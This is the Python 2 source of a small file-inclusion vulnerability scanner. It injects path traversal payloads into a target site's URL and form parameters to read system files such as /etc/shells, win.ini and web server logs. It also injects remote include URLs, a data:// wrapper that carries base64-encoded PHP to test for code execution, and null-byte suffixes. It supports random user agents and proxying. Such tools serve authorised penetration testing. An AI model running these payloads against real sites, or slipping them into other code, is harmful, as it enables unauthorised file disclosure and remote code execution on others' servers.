#!/usr/bin/env python
import itertools, optparse, random, re, urllib, urllib2

NAME, VERSION, AUTHOR, LICENSE = "Damn Small FI Scanner (DSFS) < 100 LoC (Lines of Code)", "0.1e", "Miroslav Stampar (@stamparm)", "Public domain (FREE)"

DYNAMIC_CONTENT_VALUE = "Legal disclaimer:"                                                                 # string value to search if the content is dynamically evaluated
DYNAMIC_CONTENT = "<?php echo base64_decode('%s');?>" % DYNAMIC_CONTENT_VALUE.encode("base64").strip()      # used dynamic content
COOKIE, UA, REFERER = "Cookie", "User-Agent", "Referer"                                                     # optional HTTP header names
GET, POST = "GET", "POST"                                                                                   # enumerator-like values used for marking current phase
TIMEOUT = 30                                                                                                # connection timeout in seconds

ERROR_REGEX = r"(?i)(Fatal error|Warning)(</b>)?:\s+((require|include)(_once)?|file_get_contents)\(\)"      # regular expression used for detection of vulnerability specific PHP error messages

FI_TESTS = (                                                                                                # each (test) item consists of ("filepath", "content recognition regex", (combining "prefixes"), (combining "suffixes"), 'inclusion type')
    ("", r"\[[^\]]+\]\s+\[(warn|notice|error)\]\s+\[client", ("/xampp/apache/logs/", "/apache/logs/", "/wamp/apache2/logs/", "/wamp/logs/", "/program files/wamp/apache2/logs/", "/program files/apache group/apache/logs/", "/var/log/apache/", "/var/log/apache2/", "/var/log/httpd/", "/var/log/nginx/", "/opt/lampp/logs/", "/opt/xampp/logs/"), ("error.log", "error.log%00"), 'L'),
    ("https://raw.githubusercontent.com/stamparm/DSFS/master/files/", "Usage of Damn Small FI Scanner", ("",), ("", "%00", "config", "config.php", "config.php%00", "config.jpg", "config.jpg%00"), 'R'),
    ("", "<\?php", ("/var/www/", "../../", "../", ""), ("index", "index.php", "index.php%00"), 'L'),
    ("/etc/shells", "valid login shells", ("../../../../../../..", ""), ("", "%00"), 'L'),
    ("/windows/win.ini", "for 16-bit app support", ("../../../../../../..", ""), ("", "%00"), 'L'),
    ("data://text/plain;base64,%s" % DYNAMIC_CONTENT.encode("base64").strip(), ("<?php echo base64_decode\(|%s" % DYNAMIC_CONTENT_VALUE), ("", ), ("", ), 'S'),
)

USER_AGENTS = (                                                                                             # items used for picking random HTTP User-Agent header value
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7_0; en-US) AppleWebKit/534.21 (KHTML, like Gecko) Chrome/11.0.678.0 Safari/534.21",
    "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:0.9.2) Gecko/20020508 Netscape6/6.1",
    "Mozilla/5.0 (X11;U; Linux i686; en-GB; rv:1.9.1) Gecko/20090624 Ubuntu/9.04 (jaunty) Firefox/3.5",
    "Opera/9.80 (X11; U; Linux i686; en-US; rv:1.9.2.3) Presto/2.2.15 Version/10.10"
)

_headers = {}                                                                                               # used for storing dictionary with optional header values

def _retrieve_content(url, data=None, method=None):
    try:
        req = urllib2.Request("".join(url[i].replace(' ', "%20") if i > url.find('?') else url[i] for i in xrange(len(url))), data, _headers)
        req.get_method = lambda: method or (POST if data else GET)
        retval = urllib2.urlopen(req, timeout=TIMEOUT).read()
    except Exception, ex:
        retval = ex.read() if hasattr(ex, "read") else getattr(ex, "msg", str())
    return retval or ""

def scan_page(url, data=None):
    retval, usable = False, False
    _retrieve_content(url, method=DYNAMIC_CONTENT)                                                          # dummy errorneous request
    try:
        for phase in (GET, POST):
            current = url if phase is GET else (data or "")
            for match in re.finditer(r"((\A|[?&])(?P<parameter>[\w\[\]]+)=)(?P<value>[^&#]*)", current):
                warned, found, usable = False, False, True
                print "* scanning %s parameter '%s'" % (phase, match.group("parameter"))
                for filepath, regex, prefixes, suffixes, inc_type in FI_TESTS:
                    for prefix, suffix in itertools.product(prefixes, suffixes):
                        tampered = current.replace(match.group(0), "%s%s" % (match.group(1), urllib.quote("%s%s%s" % (prefix, filepath, suffix), safe='%')))
                        content = (_retrieve_content(tampered, data) if phase is GET else _retrieve_content(url, tampered))
                        if re.search(regex, content):
                            print " (i) %s parameter '%s' appears to be (%s)FI vulnerable (e.g.: '%s')" % (phase, match.group("parameter"), inc_type, tampered)
                            if DYNAMIC_CONTENT_VALUE in content:
                                print "  (!) content seems to be dynamically evaluated"
                            found = retval = True
                            break
                        if not found and not warned and re.search(ERROR_REGEX, content, re.I):
                            print " (i) %s parameter '%s' could be FI vulnerable" % (phase, match.group("parameter"))
                            warned = True
        if not usable:
            print " (x) no usable GET/POST parameters found"
    except KeyboardInterrupt:
        print "\r (x) Ctrl-C pressed"
    return retval

def init_options(proxy=None, cookie=None, ua=None, referer=None):
    global _headers
    _headers = dict(filter(lambda _: _[1], ((COOKIE, cookie), (UA, ua or NAME), (REFERER, referer))))
    urllib2.install_opener(urllib2.build_opener(urllib2.ProxyHandler({'http': proxy})) if proxy else None)

if __name__ == "__main__":
    print "%s #v%s\n by: %s\n" % (NAME, VERSION, AUTHOR)
    parser = optparse.OptionParser(version=VERSION)
    parser.add_option("-u", "--url", dest="url", help="Target URL (e.g. \"http://www.target.com/page.php?id=1\")")
    parser.add_option("--data", dest="data", help="POST data (e.g. \"query=test\")")
    parser.add_option("--cookie", dest="cookie", help="HTTP Cookie header value")
    parser.add_option("--user-agent", dest="ua", help="HTTP User-Agent header value")
    parser.add_option("--random-agent", dest="randomAgent", action="store_true", help="Use randomly selected HTTP User-Agent header value")
    parser.add_option("--referer", dest="referer", help="HTTP Referer header value")
    parser.add_option("--proxy", dest="proxy", help="HTTP proxy address (e.g. \"http://127.0.0.1:8080\")")
    options, _ = parser.parse_args()
    if options.url:
        init_options(options.proxy, options.cookie, options.ua if not options.randomAgent else random.choice(USER_AGENTS), options.referer)
        result = scan_page(options.url if options.url.startswith("http") else "http://%s" % options.url, options.data)
        print "\nscan results: %s vulnerabilities found" % ("possible" if result else "no")
    else:
        parser.print_help()
